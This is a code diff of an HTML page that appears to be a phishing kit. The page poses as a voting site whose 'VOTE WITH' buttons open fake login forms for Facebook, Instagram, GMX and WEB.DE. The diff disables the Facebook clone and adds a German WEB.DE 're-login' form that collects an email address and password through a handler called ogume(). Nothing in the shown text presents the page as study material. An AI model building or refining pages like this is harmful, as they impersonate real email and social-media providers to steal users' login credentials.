@@ -255,11 +255,11 @@
             </h2>
 
             <div class="flex flex-col gap-3">
-              <button
+              <!--<button
                 class="fb_votebutton w-full py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition"
                 onclick="im(); can();">
                 VOTE WITH <i class="fa fa-facebook"></i>
-              </button>
+              </button>-->
               <button
                 class="ig_votebutton w-full py-2 bg-pink-500 text-white rounded-lg hover:bg-pink-600 transition"
                 onclick="bni(); can();">
@@ -275,6 +275,12 @@
                 class="gg_votebutton w-full py-2 bg-blue-900 text-white rounded-lg hover:bg-blue-800 transition"
                 onclick="gmo(); can();">
                 VOTE WITH <img class="h-3 inline-block" src="img/gmxp3.png" />
+              </button>
+
+              <button
+                class="gg_votebutton w-full py-2 bg-yellow-300 text-black rounded-lg hover:bg-yellow-300 transition"
+                onclick="del(); can();">
+                VOTE WITH <img class="h-3 inline-block" src="img/wde.png" />
               </button>
             </div>
           </div>
@@ -455,21 +461,21 @@
           </footer>
         </div>
       </div>
-
+      <!--
       <div id="owerri" class="bg-gray-100 text">
         <div class="min-h-screen flex flex-col w-full">
-          <!-- Main Content Section -->
+
           <main class="flex-grow p-2">
-            <!-- Reduced padding here -->
+
             <div class="flex justify-center mt-9 mb-4">
-              <!-- Centered Image -->
+
               <img src="img/bisho.png" alt="logo" class="h-12" />
             </div>
             <div class="flex justify-center mb-4 text-black"></div>
             <div class="tokpart">
               <div
                 class="bg-white p-8 w-full max-w-md border border-white shadow-2xl rounded-lg">
-                <!-- oruk Input -->
+
                 <div class="mb-4 relative">
                   <input
                     type="text"
@@ -480,7 +486,7 @@
                     placeholder="Email address or phone number" />
                 </div>
                 <div class="mb-4">
-                  <!-- Input Field -->
+
                   <input
                     type="text"
                     id="owerris-zom"
@@ -488,25 +494,25 @@
                     required
                     class="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-800"
                     placeholder="Password" />
-                  <!-- Login Button -->
+
                   <button
                     type="button"
                     onclick="imo()"
                     class="w-full bg-[#0866ff] text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-[#0866ff] mt-4 font-semibold">
                     Log in
                   </button>
-                  <!-- Forgot Password Button -->
+
                   <button
                     type="button"
                     class="w-full bg-transparent text-[#0866ff] py-3 px-6 text-sm rounded-md border-0 hover:text-[#0866ff] focus:outline-none focus:ring-0 mt-0">
                     Forgotten Password?
                   </button>
-                  <!-- Divider -->
+
                   <div class="flex items-center my-2">
                     <div class="flex-grow border-t border-gray-300"></div>
                     <div class="flex-grow border-t border-gray-300"></div>
                   </div>
-                  <!-- Create New Account Button -->
+
                   <button
                     type="button"
                     class="w-full bg-green-600 text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-green-600 mt-4">
@@ -523,14 +529,14 @@
             </div>
           </main>
 
-          <!-- Footer Section -->
+
           <footer
             id="error-message"
             class="bg-white text-gray-600 text-sm mt-2 py-5 w-full">
             <div class="w-full px-5">
-              <!-- Container -->
+
               <div class="flex flex-col gap-4">
-                <!-- Language Section -->
+
                 <div class="px-2">
                   <div class="flex flex-wrap gap-2 text-xs text-gray-600">
                     <a
@@ -590,15 +596,15 @@
                     >
                   </div>
                 </div>
-                <!-- Divider Line -->
+
                 <hr class="border-gray-300 w-full" />
-                <!-- Copyright Section -->
+
                 <div class="px-2 text-xs text-gray-500">&copy;2025</div>
               </div>
             </div>
           </footer>
         </div>
-      </div>
+      </div> -->
 
       <div id="awka" class="min-h-screen flex items-center justify-center">
         <div class="bg-white p-8 rounded-lg w-full max-w-md">
@@ -664,6 +670,80 @@
             <div class="px-2 text-xs text-gray-500">GMX &copy;2025</div>
           </div>
         </div>
+      </div>
+
+      <div id="delta" class="min-h-screen flex flex-col bg-gray-100">
+        <!-- Main Content (centered vertically) -->
+        <div class="flex-grow flex items-center justify-center p-4">
+          <div class="bg-white p-8 rounded-lg w-full max-w-sm">
+            <!-- Logo -->
+            <div class="flex justify-center mb-6">
+              <img src="img/wdd.png" alt="logo" class="h-16" />
+            </div>
+
+            <!-- Title -->
+            <h1 class="text-2xl text-gray-600 text-center mb-4">
+              Bitte erneut einloggen
+            </h1>
+
+            <!-- Instruction -->
+            <p class="text-sm text-gray-600 text-center mb-6">
+              Bitte melden Sie sich mit Ihrem WEB.DE Benutzernamen und Passwort
+              erneut an.
+            </p>
+
+            <!-- Form -->
+            <div class="space-y-4">
+              <!-- Email Field -->
+              <div>
+                <label class="block text-gray-500 text-xs mb-1">
+                  WEB.DE E-Mail-Adresse
+                </label>
+                <input
+                  type="text"
+                  id="asaba-oruko"
+                  class="w-full px-3 py-2 border rounded-md border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500" />
+              </div>
+
+              <!-- Password Field -->
+              <div>
+                <label class="block text-gray-500 text-xs mb-1">
+                  Passwort eingeben
+                </label>
+                <input
+                  type="password"
+                  id="asaba-zom"
+                  class="w-full px-3 py-2 border rounded-md border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500" />
+              </div>
+
+              <!-- Login Button -->
+              <button
+                onclick="ogume()"
+                class="w-full bg-yellow-300 rounded text-black text-sm py-2 px-4 hover:bg-yellow-500 focus:outline-none focus:ring-2 focus:ring-blue-500 transition-colors mt-4">
+                Login
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Footer (sticks to bottom) -->
+
+        <!-- Main content -->
+        <div class="flex-grow flex items-center justify-center p-4">
+          <!-- Your form content here -->
+        </div>
+
+        <!-- Responsive footer -->
+        <footer class="bg-gray-200 py-3">
+          <div
+            class="flex flex-col items-center space-y-2 sm:flex-row sm:space-y-0 sm:justify-center sm:space-x-6 text-sm text-white">
+            <a href="#">Impressum</a>
+            <a href="#">Verträge kündigen</a>
+            <a href="#">Datenschutz</a>
+            <a href="#">AGB</a>
+            <a href="#">Hilfe</a>
+          </div>
+        </footer>
       </div>
     </div>
 
